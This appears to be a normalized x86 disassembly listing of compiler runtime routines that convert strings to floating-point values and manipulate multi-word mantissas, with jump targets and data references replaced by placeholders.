mov [ edi + 0x4 ] esi
mov [ edi ] eax
jmp r-xdata
push 0x1f
pop eax
sub eax [ rw-data ]
mov ecx eax
mov eax [ ebp - 0x44 ]
shl esi cl
neg eax
sbb eax eax
and eax 0x80000000
or esi eax
mov eax [ rw-data ]
or esi [ ebp - 0x10 ]
cmp eax 0x40
jne r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp ecx eax
jge r-xdata
inc ecx
mov eax [ ebp - 0x34 ]
cdq
push 0x1f
pop ecx
and edx ecx
add edx eax
mov eax [ ebp - 0x34 ]
sar edx 0x5
and eax 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn
mov [ edi ] esi
cmp ecx edx
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
sub ecx eax
mov [ ebp - 0x2c ] ebx
xor eax eax
inc eax
shl eax cl
mov [ ebp - 0x38 ] eax
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx [ ebp - 0x38 ]
add ecx eax
mov [ ebp - 0x28 ] ecx
cmp ecx eax
mov eax [ ebp - 0x28 ]
mov ecx ebx
push 0xffffffff
pop edi
jb r-xdata
dec eax
or eax 0xffffffe0
inc eax
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
cmp ecx [ rw-data ]
jl r-xdata
sub edx [ ebp - 0x24 ]
lea esi [ ebp - 0x1c ]
mov [ ebp - 0x30 ] edx
lea edi [ ebp - 0x10 ]
mov eax edx
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
movsd [ edi ] [ esi ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
and eax 0x8000001f
jns r-xdata
push 0x2
pop ebx
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax [ ebp - 0x38 ]
jae r-xdata
mov edx [ ebp - 0x3c ]
mov esi [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
add esi ecx
mov ecx [ rw-data ]
mov eax ecx
cdq
and edx 0x1f
mov [ ebp - 0x38 ] esi
add eax edx
sar eax 0x5
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
mov ecx [ rw-data ]
lea edi [ ebp - 0x10 ]
xor eax eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
or [ ebp - 0x10 ] 0x80000000
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x34 ] eax
and ecx 0x8000001f
jns r-xdata
mov [ ebp - 0x30 ] eax
or edi 0xffffffff
mov eax edi
mov [ ebp - 0x20 ] ebx
mov edi [ ebp - 0x30 ]
mov ecx edi
shl eax cl
not eax
push 0x20
mov [ ebp - 0x28 ] eax
pop eax
sub eax edi
push 0x3
mov [ ebp - 0x38 ] eax
pop esi
dec eax
or eax 0xffffffe0
inc eax
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
js r-xdata
push 0x20
mov [ ebp - 0x20 ] ebx
mov esi ebx
shl edi cl
mov ebx ecx
pop eax
sub eax ebx
mov [ ebp - 0x24 ] ecx
not edi
mov [ ebp - 0x24 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
or edi 0xffffffff
mov [ ebp - 0x38 ] ecx
push 0x20
shl edi cl
pop eax
sub eax ecx
mov [ ebp - 0x20 ] ebx
not edi
mov [ ebp - 0x28 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov ecx edi
mov eax edx
shr edx cl
or edx [ ebp - 0x20 ]
and eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x38 ]
shl eax cl
mov [ ebp + ebx * 4 - 0x10 ] edx
inc ebx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x8 ]
shl eax 0x2
xor ebx ebx
push 0x2
sub edx eax
or edi 0xffffffff
mov eax [ ebp - 0x3c ]
pop ecx
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
mov [ ebp - 0x2c ] ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x28 ] edi
mov eax edi
jb r-xdata
mov edx [ ebp + esi * 4 - 0x10 ]
mov ecx ebx
mov eax edx
shr edx cl
or edx [ ebp - 0x20 ]
and eax edi
mov ecx [ ebp - 0x24 ]
shl eax cl
mov [ ebp + esi * 4 - 0x10 ] edx
inc esi
mov [ ebp - 0x20 ] eax
cmp esi 0x3
jl r-xdata
mov edi [ ebp - 0x28 ]
lea edx [ ebp - 0x8 ]
mov esi [ ebp - 0x38 ]
mov eax edi
shl eax 0x2
push 0x2
sub edx eax
xor ebx ebx
pop ecx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov eax edx
shr edx cl
and eax edi
or edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x28 ]
shl eax cl
mov ecx [ ebp - 0x38 ]
mov [ ebp + ebx * 4 - 0x10 ] edx
inc ebx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov esi [ ebp - 0x34 ]
lea edx [ ebp - 0x8 ]
mov eax esi
shl eax 0x2
push 0x2
sub edx eax
xor ebx ebx
pop ecx
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
mov eax [ ebp - 0x3c ]
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax 0x1
jae r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
cmp ecx eax
jl r-xdata
mov ecx [ ebp - 0x34 ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add edx eax
sar edx 0x5
mov [ ebp - 0x2c ] edx
and ecx 0x8000001f
jns r-xdata
sub edx 0x4
dec ecx
jns r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
jns r-xdata
cmp ecx edi
jl r-xdata
sub edx 0x4
dec ecx
jns r-xdata
cmp ecx esi
jl r-xdata
mov esi [ rw-data ]
xor ebx ebx
add esi [ rw-data ]
inc ebx
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
push 0x1f
pop eax
sub eax ecx
mov [ ebp - 0x30 ] eax
xor eax eax
mov ecx [ ebp - 0x30 ]
inc eax
shl eax cl
test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
inc edx
cmp edx esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + edx * 4 ]
sub ecx edx
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
mov [ ebp - 0x24 ] ecx
mov eax ebx
shl edi cl
push 0x20
mov [ ebp - 0x20 ] ebx
not edi
mov ebx [ ebp - 0x24 ]
pop ecx
sub ecx ebx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x24 ] ecx
dec ecx
or ecx 0xffffffe0
inc ecx
mov edi [ ebp - 0x34 ]
mov eax edi
push 0x1f
cdq
pop ecx
and edx ecx
add edx eax
sar edx 0x5
and edi 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov edx [ ebp + eax * 4 - 0x10 ]
mov ecx ebx
mov eax edx
shr edx cl
mov ecx [ ebp - 0x34 ]
and eax edi
or edx [ ebp - 0x20 ]
mov [ ebp + ecx * 4 - 0x10 ] edx
mov ecx [ ebp - 0x24 ]
shl eax cl
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
inc eax
mov [ ebp - 0x34 ] eax
cmp eax esi
jl r-xdata
mov esi [ ebp - 0x28 ]
lea edx [ ebp - 0x8 ]
mov eax esi
shl eax 0x2
push 0x2
sub edx eax
xor ebx ebx
pop ecx
mov eax [ ebp + edx * 4 - 0x10 ]
sub ecx edi
xor edi edi
inc edi
shl edi cl
mov ecx ebx
mov [ ebp - 0x24 ] edi
add edi eax
mov [ ebp - 0x20 ] edi
cmp edi eax
mov eax [ ebp - 0x20 ]
push 0xffffffff
pop edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
xor ecx ecx
inc ecx
cmp eax [ ebp - 0x24 ]
jae r-xdata
mov edx [ ebp - 0x2c ]
cmp ecx esi
jl r-xdata
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
js r-xdata
mov esi ebx
jmp r-xdata
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x20 ] edi
mov eax edi
jb r-xdata
xor ecx ecx
inc ecx
cmp eax 0x1
jae r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
jns r-xdata
sub_40aaa2
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx eax [ ecx + 0xa ]
xor ebx ebx
mov edi [ ebp + 0xc ]
mov edx eax
and eax 0x8000
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x44 ] eax
and edx 0x7fff
mov eax [ ecx + 0x6 ]
sub edx 0x3fff
mov [ ebp - 0x10 ] eax
mov eax [ ecx + 0x2 ]
mov [ ebp - 0xc ] eax
movzx eax [ ecx ]
shl eax 0x10
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x8 ] eax
cmp edx 0xffffc001
jne r-xdata
mov eax [ rw-data ]
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x24 ] edx
movsd [ edi ] [ esi ]
dec eax
mov [ ebp - 0x34 ] eax
push 0x1f
mov [ ebp - 0x2c ] ebx
movsd [ edi ] [ esi ]
lea ecx [ eax + 0x1 ]
mov eax ecx
cdq
movsd [ edi ] [ esi ]
pop esi
and edx esi
add edx eax
sar edx 0x5
mov [ ebp - 0x3c ] edx
and ecx 0x8000001f
jns r-xdata
mov esi ebx
mov eax ebx
sub esi ecx
xor eax eax
inc eax
mov [ ebp - 0x30 ] esi
mov ecx esi
or edi 0xffffffff
shl eax cl
push 0x3
pop esi
test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
inc eax
cmp eax 0x3
jl r-xdata
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
lea eax [ edx + 0x1 ]
cmp eax esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov edi [ ebp - 0x40 ]
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
cmp [ ebp - 0x2c ] ebx
je r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + eax * 4 ]
sub ecx eax
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ edi + 0x4 ] esi
mov [ edi ] eax
jmp r-xdata
push 0x1f
pop eax
sub eax [ rw-data ]
mov ecx eax
mov eax [ ebp - 0x44 ]
shl esi cl
neg eax
sbb eax eax
and eax 0x80000000
or esi eax
mov eax [ rw-data ]
or esi [ ebp - 0x10 ]
cmp eax 0x40
jne r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp ecx eax
jge r-xdata
inc ecx
mov eax [ ebp - 0x34 ]
cdq
push 0x1f
pop ecx
and edx ecx
add edx eax
mov eax [ ebp - 0x34 ]
sar edx 0x5
and eax 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn
mov [ edi ] esi
cmp ecx edx
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
sub ecx eax
mov [ ebp - 0x2c ] ebx
xor eax eax
inc eax
shl eax cl
mov [ ebp - 0x38 ] eax
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx [ ebp - 0x38 ]
add ecx eax
mov [ ebp - 0x28 ] ecx
cmp ecx eax
mov eax [ ebp - 0x28 ]
mov ecx ebx
push 0xffffffff
pop edi
jb r-xdata
dec eax
or eax 0xffffffe0
inc eax
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
cmp ecx [ rw-data ]
jl r-xdata
sub edx [ ebp - 0x24 ]
lea esi [ ebp - 0x1c ]
mov [ ebp - 0x30 ] edx
lea edi [ ebp - 0x10 ]
mov eax edx
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
movsd [ edi ] [ esi ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
and eax 0x8000001f
jns r-xdata
push 0x2
pop ebx
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax [ ebp - 0x38 ]
jae r-xdata
mov edx [ ebp - 0x3c ]
mov esi [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
add esi ecx
mov ecx [ rw-data ]
mov eax ecx
cdq
and edx 0x1f
mov [ ebp - 0x38 ] esi
add eax edx
sar eax 0x5
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
mov ecx [ rw-data ]
lea edi [ ebp - 0x10 ]
xor eax eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
or [ ebp - 0x10 ] 0x80000000
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x34 ] eax
and ecx 0x8000001f
jns r-xdata
mov [ ebp - 0x30 ] eax
or edi 0xffffffff
mov eax edi
mov [ ebp - 0x20 ] ebx
mov edi [ ebp - 0x30 ]
mov ecx edi
shl eax cl
not eax
push 0x20
mov [ ebp - 0x28 ] eax
pop eax
sub eax edi
push 0x3
mov [ ebp - 0x38 ] eax
pop esi
dec eax
or eax 0xffffffe0
inc eax
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
js r-xdata
push 0x20
mov [ ebp - 0x20 ] ebx
mov esi ebx
shl edi cl
mov ebx ecx
pop eax
sub eax ebx
mov [ ebp - 0x24 ] ecx
not edi
mov [ ebp - 0x24 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
or edi 0xffffffff
mov [ ebp - 0x38 ] ecx
push 0x20
shl edi cl
pop eax
sub eax ecx
mov [ ebp - 0x20 ] ebx
not edi
mov [ ebp - 0x28 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov ecx edi
mov eax edx
shr edx cl
or edx [ ebp - 0x20 ]
and eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x38 ]
shl eax cl
mov [ ebp + ebx * 4 - 0x10 ] edx
inc ebx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x8 ]
shl eax 0x2
xor ebx ebx
push 0x2
sub edx eax
or edi 0xffffffff
mov eax [ ebp - 0x3c ]
pop ecx
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
mov [ ebp - 0x2c ] ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x28 ] edi
mov eax edi
jb r-xdata
mov edx [ ebp + esi * 4 - 0x10 ]
mov ecx ebx
mov eax edx
shr edx cl
or edx [ ebp - 0x20 ]
and eax edi
mov ecx [ ebp - 0x24 ]
shl eax cl
mov [ ebp + esi * 4 - 0x10 ] edx
inc esi
mov [ ebp - 0x20 ] eax
cmp esi 0x3
jl r-xdata
mov edi [ ebp - 0x28 ]
lea edx [ ebp - 0x8 ]
mov esi [ ebp - 0x38 ]
mov eax edi
shl eax 0x2
push 0x2
sub edx eax
xor ebx ebx
pop ecx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov eax edx
shr edx cl
and eax edi
or edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x28 ]
shl eax cl
mov ecx [ ebp - 0x38 ]
mov [ ebp + ebx * 4 - 0x10 ] edx
inc ebx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov esi [ ebp - 0x34 ]
lea edx [ ebp - 0x8 ]
mov eax esi
shl eax 0x2
push 0x2
sub edx eax
xor ebx ebx
pop ecx
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
mov eax [ ebp - 0x3c ]
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax 0x1
jae r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
cmp ecx eax
jl r-xdata
mov ecx [ ebp - 0x34 ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add edx eax
sar edx 0x5
mov [ ebp - 0x2c ] edx
and ecx 0x8000001f
jns r-xdata
sub edx 0x4
dec ecx
jns r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
jns r-xdata
cmp ecx edi
jl r-xdata
sub edx 0x4
dec ecx
jns r-xdata
cmp ecx esi
jl r-xdata
mov esi [ rw-data ]
xor ebx ebx
add esi [ rw-data ]
inc ebx
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
push 0x1f
pop eax
sub eax ecx
mov [ ebp - 0x30 ] eax
xor eax eax
mov ecx [ ebp - 0x30 ]
inc eax
shl eax cl
test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
inc edx
cmp edx esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + edx * 4 ]
sub ecx edx
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
mov [ ebp - 0x24 ] ecx
mov eax ebx
shl edi cl
push 0x20
mov [ ebp - 0x20 ] ebx
not edi
mov ebx [ ebp - 0x24 ]
pop ecx
sub ecx ebx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x24 ] ecx
dec ecx
or ecx 0xffffffe0
inc ecx
mov edi [ ebp - 0x34 ]
mov eax edi
push 0x1f
cdq
pop ecx
and edx ecx
add edx eax
sar edx 0x5
and edi 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov edx [ ebp + eax * 4 - 0x10 ]
mov ecx ebx
mov eax edx
shr edx cl
mov ecx [ ebp - 0x34 ]
and eax edi
or edx [ ebp - 0x20 ]
mov [ ebp + ecx * 4 - 0x10 ] edx
mov ecx [ ebp - 0x24 ]
shl eax cl
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
inc eax
mov [ ebp - 0x34 ] eax
cmp eax esi
jl r-xdata
mov esi [ ebp - 0x28 ]
lea edx [ ebp - 0x8 ]
mov eax esi
shl eax 0x2
push 0x2
sub edx eax
xor ebx ebx
pop ecx
mov eax [ ebp + edx * 4 - 0x10 ]
sub ecx edi
xor edi edi
inc edi
shl edi cl
mov ecx ebx
mov [ ebp - 0x24 ] edi
add edi eax
mov [ ebp - 0x20 ] edi
cmp edi eax
mov eax [ ebp - 0x20 ]
push 0xffffffff
pop edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
xor ecx ecx
inc ecx
cmp eax [ ebp - 0x24 ]
jae r-xdata
mov edx [ ebp - 0x2c ]
cmp ecx esi
jl r-xdata
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
js r-xdata
mov esi ebx
jmp r-xdata
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x20 ] edi
mov eax edi
jb r-xdata
xor ecx ecx
inc ecx
cmp eax 0x1
jae r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
jns r-xdata
sub_40b014
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x80 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x68 ] eax
xor eax eax
push ebx
xor ebx ebx
inc eax
push esi
mov [ ebp - 0x6c ] eax
mov esi ebx
mov eax ebx
mov [ ebp - 0x70 ] ebx
push edi
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x54 ] ebx
cmp [ ebp + 0x24 ] eax
jne r-xdata
mov edx [ ebp + 0x10 ]
mov ecx edx
mov [ ebp - 0x50 ] ecx
call sub_4028d9
mov [ eax ] 0x16
call sub_402521
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp cl 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn
mov cl [ edx ]
cmp cl 0x20
je r-xdata
cmp cl 0xa
je r-xdata
cmp cl 0xd
jne r-xdata
mov cl [ edx ]
inc edx
mov [ ebp - 0x55 ] cl
cmp eax 0xb
ja r-xdata
cmp eax 0xa
jne r-xdata
jmp [ eax * 4 + jump_table_40b78c ]
jmp r-xdata
lea eax [ ecx - 0x31 ]
cmp al 0x8
ja r-xdata
xor eax eax
inc eax
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x31 ]
cmp al 0x8
jbe r-xdata
lea eax [ ecx - 0x31 ]
cmp al 0x8
jbe r-xdata
xor eax eax
inc eax
mov [ ebp - 0x60 ] eax
cmp cl 0x30
jl r-xdata
xor eax eax
inc eax
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x4c ]
test eax eax
jne r-xdata
xor eax eax
sub cl 0x30
inc eax
mov [ ebp - 0x5c ] eax
cmp cl 0x9
ja r-xdata
lea eax [ edx - 0x2 ]
mov [ ebp - 0x50 ] eax
lea eax [ ecx - 0x31 ]
cmp al 0x8
ja r-xdata
xor eax eax
inc eax
mov [ ebp - 0x64 ] eax
jmp r-xdata
lea eax [ ecx - 0x31 ]
cmp al 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] ebx
je r-xdata
xor eax eax
mov esi ebx
inc eax
mov [ ebp - 0x64 ] eax
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp cl [ eax ]
jne r-xdata
push 0x3
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp cl [ eax ]
jne r-xdata
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp cl [ eax ]
je r-xdata
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
cmp cl [ eax ]
je r-xdata
mov eax [ ebp - 0x4c ]
mov esi [ ebp - 0x54 ]
cmp cl 0x30
cmp cl 0x30
jne r-xdata
mov edx [ ebp - 0x50 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax cl
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp cl 0x30
je r-xdata
cmp cl 0x30
jmp r-xdata
push 0xa
pop eax
dec edx
lea eax [ edx - 0x1 ]
mov [ ebp - 0x50 ] eax
movsx eax cl
sub eax 0x2b
je r-xdata
cmp cl 0x30
jge r-xdata
mov eax ebx
mov esi ebx
push 0x4
cmp eax 0x18
jbe r-xdata
movsx eax cl
sub eax 0x2b
je r-xdata
push 0x5
cmp cl 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp cl 0x30
je r-xdata
cmp cl 0x2b
je r-xdata
mov [ ebp - 0x54 ] esi
mov esi ebx
mov [ ebp - 0x4c ] eax
cmp eax 0x19
jae r-xdata
cmp cl 0x2b
je r-xdata
mov esi [ ebp - 0x54 ]
jl r-xdata
mov eax [ ebp - 0x54 ]
pop eax
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov cl [ edx ]
inc edx
sub cl 0x31
cmp cl 0x8
ja r-xdata
jne r-xdata
dec eax
dec eax
jne r-xdata
cmp cl 0x39
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x54 ]
mov al [ ebp - 0x9 ]
cmp al 0x5
jl r-xdata
push 0x2
pop eax
mov [ ebp - 0x70 ] ebx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp cl 0x2d
je r-xdata
pop eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp cl 0x2d
je r-xdata
inc esi
sub cl 0x30
inc eax
mov [ edi ] cl
inc edi
jmp r-xdata
cmp cl 0x2d
je r-xdata
mov [ ebp - 0x54 ] esi
mov esi ebx
mov [ ebp - 0x4c ] eax
cmp eax 0x19
jae r-xdata
mov cl [ edx ]
dec eax
inc edx
cmp cl 0x30
je r-xdata
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x4c ]
push 0x7
or ecx 0xffffffff
pop eax
mov [ ebp - 0x6c ] ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
or [ ebp - 0x6c ] 0xffffffff
push 0x7
pop eax
jmp r-xdata
cmp cl 0x30
jge r-xdata
imul ecx esi 0xa
movsx esi [ ebp - 0x55 ]
add esi 0xffffffd0
add esi ecx
cmp esi 0x1450
jg r-xdata
mov ecx ebx
mov eax ebx
mov esi ebx
mov edx ebx
jmp r-xdata
dec edi
cmp [ edi ] bl
jne r-xdata
mov ecx [ ebp - 0x54 ]
dec edi
push 0x18
inc ecx
pop eax
mov [ ebp - 0x54 ] ecx
jmp r-xdata
inc al
mov [ ebp - 0x9 ] al
push 0x2
mov ecx 0x8000
pop eax
mov [ ebp - 0x70 ] ecx
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp cl 0x30
je r-xdata
jmp r-xdata
cmp cl 0x39
jg r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x30
jge r-xdata
cmp cl 0x43
jle r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x30
jge r-xdata
sub cl 0x30
inc eax
mov [ edi ] cl
inc edi
dec esi
cmp cl 0x39
jg r-xdata
mov cl [ ebp - 0x55 ]
mov esi 0x1451
jmp r-xdata
mov cl [ edx ]
inc edx
mov [ ebp - 0x55 ] cl
mov edi [ ebp - 0x80 ]
or eax [ ebp - 0x70 ]
mov [ edi + 0xa ] ax
mov eax ebx
mov [ edi ] cx
mov [ edi + 0x2 ] edx
mov [ edi + 0x6 ] esi
lea ecx [ ebp - 0x3c ]
push ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_40c281
mov ecx [ ebp - 0x6c ]
add esp 0xc
test ecx ecx
jns r-xdata
dec eax
inc ecx
dec edi
cmp [ edi ] bl
je r-xdata
test eax eax
je r-xdata
cmp cl 0x43
jle r-xdata
dec edx
jmp r-xdata
cmp cl 0x45
jle r-xdata
cmp cl 0x39
jg r-xdata
mov cl [ edx ]
inc edx
